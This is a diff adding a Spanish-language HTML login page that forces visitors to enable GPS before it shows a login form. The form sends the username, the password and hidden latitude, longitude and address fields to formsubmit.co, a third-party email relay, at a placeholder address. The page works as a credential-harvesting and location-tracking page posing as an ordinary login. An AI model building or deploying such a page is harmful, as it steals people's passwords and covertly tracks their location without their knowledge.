@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Inicio de sesión con GPS obligatorio</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@3.3.0/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+  <div id="bloqueo" class="text-center">
+    <h1 class="text-3xl font-bold text-red-600 mb-4">📍 GPS requerido</h1>
+    <p class="text-gray-700 mb-6">Activa tu ubicación para continuar al inicio de sesión.</p>
+    <button onclick="verificarGPS()" class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-800">Activar GPS</button>
+  </div>
+
+  <div id="login" class="hidden text-center">
+    <h1 class="text-3xl font-bold text-green-600 mb-4">✅ GPS activo</h1>
+    <p class="text-gray-700 mb-6">Bienvenido. Ingresa tus credenciales.</p>
+    <form action="https://formsubmit.co/tu-correo@example.com" method="POST" class="space-y-4">
+      <input type="text" name="usuario" placeholder="Usuario" class="px-4 py-2 border rounded w-full">
+      <input type="password" name="clave" placeholder="Contraseña" class="px-4 py-2 border rounded w-full">
+      <input type="hidden" name="Latitud" id="latitudInput">
+      <input type="hidden" name="Longitud" id="longitudInput">
+      <input type="hidden" name="Dirección" id="direccionInput">
+      <button type="submit" class="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-800">Iniciar sesión</button>
+    </form>
+  </div>
+  
+<!-- Agrega esto en index.html si quieres mostrar el mapa -->
+<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+
+<div id="mapa" class="w-full h-64 mt-6"></div>
+
+  <script src="geolocalizacion.js"></script>
+</body>
+</html>
